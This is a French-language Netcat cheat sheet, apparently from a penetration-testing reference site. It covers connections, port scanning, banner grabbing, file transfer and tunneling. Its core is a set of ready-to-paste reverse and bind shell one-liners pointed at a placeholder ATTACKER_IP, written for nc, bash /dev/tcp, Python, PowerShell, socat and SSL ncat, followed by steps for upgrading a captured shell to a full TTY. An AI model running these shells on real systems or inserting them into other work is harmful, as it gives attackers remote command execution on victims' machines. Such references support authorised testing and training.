Netcat (nc)
Le couteau suisse du réseau — TCP/UDP, reverse shells, transferts, scan
Réseau Shells TCP/UDP

📦 Versions et installation

Installation
# Debian/Ubuntu/Kali — netcat-openbsd (recommandé)
sudo apt install netcat-openbsd

# Version traditionnelle (avec -e)
sudo apt install netcat-traditional

# ncat (Nmap) — version moderne, SSL, proxy
sudo apt install ncat

# Vérifier la version
nc --version
ncat --version
ℹ️
Note : La version OpenBSD de nc (par défaut sur Kali) ne supporte pas -e. Utilisez ncat ou les techniques alternatives pour les reverse shells.

📋 Cheatsheet complet

Connexions de base

Connexions TCP/UDP
# Connexion TCP à un hôte
nc 192.168.1.1 80

# Connexion UDP
nc -u 192.168.1.1 53

# Écouter sur un port (listener)
nc -lvnp 4444
# -l listen  -v verbose  -n no DNS  -p port

# Écouter et rester actif après déconnexion (ncat)
ncat -lvnp 4444 --keep-open

# Tester si un port est ouvert
nc -zv 192.168.1.1 22
nc -zv 192.168.1.1 20-100

# Scan de ports rapide
nc -zv -w 1 192.168.1.1 1-1024 2>&1 | grep "open"

# Banner grabbing (identification de service)
echo "" | nc -w 2 192.168.1.1 22
echo "HEAD / HTTP/1.0" | nc 192.168.1.1 80

Reverse Shells

Reverse Shells avec nc
# ============================================
# LISTENER (machine attaquante) — TOUJOURS D'ABORD
nc -lvnp 4444
# ============================================

# Reverse shell nc avec -e (version traditionnelle)
nc ATTACKER_IP 4444 -e /bin/bash
nc ATTACKER_IP 4444 -e /bin/sh

# Reverse shell nc sans -e (OpenBSD)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# ncat (supporte -e)
ncat ATTACKER_IP 4444 -e /bin/bash

# Reverse shell Windows (PowerShell)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}"

# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

Bind Shells

Bind Shells
# Sur la machine cible — écoute et offre un shell
nc -lvnp 4444 -e /bin/bash

# Sans -e (OpenBSD)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f

# Connexion depuis l'attaquant
nc TARGET_IP 4444

Transfert de fichiers

File Transfer
# Envoyer un fichier (depuis l'émetteur)
# 1. Récepteur écoute
nc -lvnp 4444 > fichier_reçu.txt

# 2. Émetteur envoie
nc RECEIVER_IP 4444 < fichier_local.txt

# Transfert de répertoire compressé
# Récepteur :
nc -lvnp 4444 | tar xzvf -

# Émetteur :
tar czvf - /dossier/ | nc RECEIVER_IP 4444

# Transfert avec indicateur de progression (pv)
nc -lvnp 4444 | pv > output.bin
cat input.bin | pv | nc IP 4444

Upgrade de shell TTY

TTY Upgrade — Shell complet
# Méthode 1 — Python pty (la plus courante)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Méthode 2 — script
script /dev/null -c bash

# Méthode 3 — socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

# Après Python pty — obtenir un vrai TTY interactif :
# 1. Ctrl+Z (mettre nc en arrière-plan)
stty raw -echo; fg
# 2. Appuyer sur Entrée deux fois
# 3. Configurer le terminal
export TERM=xterm
stty rows 50 columns 200

# Vérifier les dimensions du terminal
stty -a | head -1

Tunneling et pivoting

Tunneling avec nc
# Port forwarding simple (avec ncat)
ncat -lvnp 8080 --sh-exec "ncat 192.168.1.1 80"

# Proxy basique (avec mkfifo)
mkfifo /tmp/pipe
nc -lvnp 8080 < /tmp/pipe | nc 192.168.1.1 80 > /tmp/pipe

# ncat SSL (chiffrement de la connexion)
ncat --ssl -lvnp 4444
ncat --ssl ATTACKER_IP 4444 -e /bin/bash

# Chat entre deux machines
# Machine 1 :
nc -lvnp 4444
# Machine 2 :
nc IP_MACHINE1 4444
